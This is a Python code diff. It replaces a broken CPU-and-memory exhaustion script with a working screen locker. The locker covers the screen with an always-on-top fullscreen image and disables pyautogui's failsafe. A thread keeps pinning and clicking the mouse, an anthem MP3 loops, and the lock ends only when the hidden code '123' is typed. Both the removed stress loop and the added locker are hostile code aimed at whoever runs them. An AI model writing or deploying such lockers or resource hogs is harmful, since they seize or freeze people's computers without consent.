@@ -1,22 +1,44 @@
-import multiprocessing
-import time
+import pyautogui as g, pygame as p, tkinter as t
+from PIL import Image, ImageTk
+from threading import Thread
+import os
 
-def stress_cpu():
-    while True:
-        pass
+C = "123"
+IMG = r"C:\Users\Rog Strix\Pictures\Новая папка\448ca777ede521648f0395a992ff2af8.png"
+MUS = r"C:\Users\Rog Strix\Music\anthem-of-the-ussr-stalin.mp3" # УКАЖИТЕ ПОЛНЫЙ ПУТЬ К MP3
 
-def stress_ram():
-    memory_hog = []  
-    try:
-        while :
-            memory_hog.append(' ' * (100 * 1024 * 1024))
-            time.sleep(0.1) 
-        
-
-if __name__ == "__main__":
-    cpu_count = multiprocessing.cpu_count()
+def lock():
+    r = t.Tk()
+    r.attributes("-fullscreen", 1, "-topmost", 1)
     
-    for _ in range(cpu_count):
-        p = multiprocessing.Process(target=stress_cpu)
-        p.start()
-    stress_ram()
+    # Загрузка фото
+    img_obj = Image.open(IMG).resize((r.winfo_screenwidth(), r.winfo_screenheight()))
+    i = ImageTk.PhotoImage(img_obj)
+    t.Label(r, image=i).pack()
+
+    r.b = ""
+    def k(e):
+        r.b += e.char
+        if r.b.endswith(C): r.destroy()
+    r.bind("<Key>", k)
+
+    g.FAILSAFE = False
+    def m():
+        try:
+            while True: 
+                g.moveTo(500, 500)
+                g.click(500, 500) # Кликаем в центр, чтобы фокус не ушел
+        except: pass
+    
+    Thread(target=m, daemon=1).start()
+
+    # Музыка (запустится только если файл существует)
+    if os.path.exists(MUS):
+        p.mixer.init()
+        p.mixer.music.load(MUS)
+        p.mixer.music.play(-1)
+    
+    r.mainloop()
+
+lock()
+
